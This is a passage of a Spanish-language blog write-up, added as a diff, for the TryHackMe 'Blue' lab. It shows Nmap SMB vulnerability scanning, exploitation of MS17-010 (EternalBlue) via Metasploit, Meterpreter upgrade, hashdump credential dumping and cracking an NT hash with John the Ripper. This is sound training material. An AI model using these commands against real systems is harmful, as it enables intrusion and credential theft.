+      <td style="text-align: left">Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>
+
+<ul>
+  <li>¿Cuántos puertos están abiertos con un número de puerto inferior a 1000?</li>
+  <li>¿A qué es vulnerable esta máquina?</li>
+</ul>
+
+<p>Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con <em>Nmap</em>. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la máquina; a modo de pista, la plataforma nos da un ejemplo de respuesta: <em>ms08-067</em>.</p>
+
+<p>Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con <em>Nmap</em>, es el puerto <code class="language-plaintext highlighter-rouge">445</code>, o protocolo <code class="language-plaintext highlighter-rouge">SMB</code> (Server Message Block).</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/2.png" alt="" /></p>
+
+<p>De modo que procederemos a utilizar los scripts específicos con los que cuenta <em>Nmap</em>, para detectar vulnerabilidades en dicho protocolo.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/3.png" alt="" /></p>
+
+<p>Para poder utilizarlos podemos hacer lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span><span class="o">=</span><span class="s2">"smb-vuln*"</span> <span class="nt">-p</span> 445 &lt;dirección IP&gt;
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del protocolo <code class="language-plaintext highlighter-rouge">SMB</code> con <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">--script</td>
+      <td style="text-align: left">Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos scripts que comiencen por <em>smb-vuln</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
+      <td style="text-align: left">Especificamos a que puertos queremos aplicar este escaneo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/4.png" alt="" /></p>
+
+<p>Como podemos darnos cuenta, esta máquina es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code>, o también conocido como <code class="language-plaintext highlighter-rouge">EternalBlue</code>.</p>
+
+<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>
+
+<p>Para esta segunda fase, <em>TryHackMe</em> realiza la fase de explotación con el uso de <code class="language-plaintext highlighter-rouge">Metasploit</code>, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina <code class="language-plaintext highlighter-rouge">Blue</code>, está pensada para ser explotada mediante el uso de <em>Metasploit</em>.</p>
+
+<p>Para hacer uso de <em>Metasploit</em> tendremos que abrir la aplicación, para ello haremos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+
+<p>Una vez hemos abierto <em>Metasploit</em>, procederemos a buscar aquello que queremos explotar, en este caso, <code class="language-plaintext highlighter-rouge">MS17-010</code>, o <code class="language-plaintext highlighter-rouge">EternalBlue</code>, cualquiera de las dos formas es válida.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search eternalblue
+search ms17-010
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/5.png" alt="" /></p>
+
+<p>Posteriormente elegiremos el <em>exploit</em> a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el <em>exploit</em> que vamos a utilizar.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/ms17_010_eternalblue
+</code></pre></div></div>
+
+<p>Una vez hemos seleccionado el <em>exploit</em>, procederemos a configurar tanto el <code class="language-plaintext highlighter-rouge">LHOST</code> como el <code class="language-plaintext highlighter-rouge">RHOST</code>, que, dicho de otra forma, procederemos a introducir nuestra <em>IP</em>, y la <em>IP</em> de la máquina víctima.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show options
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/6.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set LHOST &lt;nuestra IP&gt; 
+set RHOST &lt;IP víctima&gt;
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/7.png" alt="" /></p>
+
+<p>Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos <em>Metasploit</em> una shell dentro de la máquina víctima.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/8.png" alt="" /></p>
+
+<p>Una vez llegados a este punto, <em>TryHackMe</em> nos pide convertir nuestra shell actual, en <code class="language-plaintext highlighter-rouge">meterpreter</code>, para ello tendremos que abandonar nuestra sesión actual <code class="language-plaintext highlighter-rouge">Ctrl + Z</code>.</p>
+
+<p>Una vez fuera, tendremos que nuevamente buscar dentro de <em>Metasploit</em>, un módulo que nos permita pasar de una shell a <code class="language-plaintext highlighter-rouge">meterpreter</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search shell_to_meterpreter
+</code></pre></div></div>
+
+<p>Una vez hemos encontrado un módulo que nos sirva, tendremos que utilizarlo.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/multi/manage/shell_to_meterpreter
+</code></pre></div></div>
+
+<p>Y al igual que antes, tendremos que configurar cierto parámetro para poder conseguir un <code class="language-plaintext highlighter-rouge">meterpreter</code>, en este caso, la sesión con la que estábamos trabajando antes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show options
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/9.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions
+set SESSION 1
+run
+</code></pre></div></div>
+
+<p>La opción <code class="language-plaintext highlighter-rouge">sessions</code> nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/10.png" alt="" /></p>
+
+<p>Una vez hemos conseguido un <code class="language-plaintext highlighter-rouge">meterpreter</code>, podemos volver a nuestra sesión.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions 1
+</code></pre></div></div>
+
+<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>
+
+<p><em>TryHackMe</em> nos indica que a través del comando <code class="language-plaintext highlighter-rouge">migrate &lt;ID del proceso&gt;</code>, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>, de modo que no tiene sentido migrar al usuario que ya somos.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/11.png" alt="" /></p>
+
+<p>Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de <em>Metasploit</em>, en este caso el comando <code class="language-plaintext highlighter-rouge">hashdump</code>, con el cual podemos listar todos los usuarios del sistema, así como sus contraseñas <em>hasheadas</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/12.png" alt="" /></p>
+
+<p>En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea <em>Guest</em>, o <em>Administrator</em>; finalmente, se nos pide <em>crackear</em> la contraseña de este usuario, para ello utilizaremos la herramienta <code class="language-plaintext highlighter-rouge">John the Ripper</code>, en conjunto del diccionario <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220209T031834Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;X-Amz-SignedHeaders=host&amp;actor_id=79855501&amp;key_id=0&amp;repo_id=97553311&amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;response-content-type=application%2Foctet-stream">rockyou.txt</a>.</p>
+
+<p>En caso de no contar con la herramienta <code class="language-plaintext highlighter-rouge">John the Ripper</code> instalada, podemos hacer lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install john
+</code></pre></div></div>
+
+<p>En nuestra máquina, crearemos un documento de texto que contenga la contraseña <em>hasheada</em> del usuario, podemos hacerlo de manera manual, o desde la misma terminal:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::"</span> <span class="o">&gt;&gt;</span> nombreArchivo
+</code></pre></div></div>
+
+<p>Una vez creado el archivo de texto, podemos pasar a <em>crackear</em> la contraseña:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo john --format=NT --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/13.png" alt="" /></p>
+
+<p>Una vez hemos <em>crackeado</em> la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema <em>Windows</em>, por lo que es aconsejable aprender estas locaciones.</p>
+
+<p>La primera flag dice que se encuentra en la raíz del sistema, dicho de otra forma, <code class="language-plaintext highlighter-rouge">Disco Local C</code>.</p>
+
+<p>Para poder navegar dentro de la máquina víctima, podríamos usar el mismo <code class="language-plaintext highlighter-rouge">meterpreter</code>, sin embargo, en este caso nos manejaremos a través de una shell, para ello ejecutaremos el comando <code class="language-plaintext highlighter-rouge">shell</code>. Una vez hecho esto, podemos ir hacia el directorio <code class="language-plaintext highlighter-rouge">C:\\</code>, listar su contenido y encontrar la flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\\
+dir
+type flag1.txt
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/14.png" alt="" /></p>
+
+<p>La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, <code class="language-plaintext highlighter-rouge">C:\Windows\System32\Config</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\Windows\System32\Config
+dir
+type flag2.txt
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/15.png" alt="" /></p>
+
+<p>La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas “bastante interesantes”, personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo <code class="language-plaintext highlighter-rouge">flag3.txt</code>, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd \
+dir flag3.txt /s /p 
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/16.png" alt="" /></p>
+
+<p>Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante, es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\Users\Jon\Documents
+dir  
+type flag3.txt  
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/17.png" alt="" /></p>
+
+</article>
+
+      </section>
+    </div>
+  </div>
+
+  
+
+  <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>m4teo</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+
+  
+    <script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-524F5BE8G5', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+
+</body>
+</html>
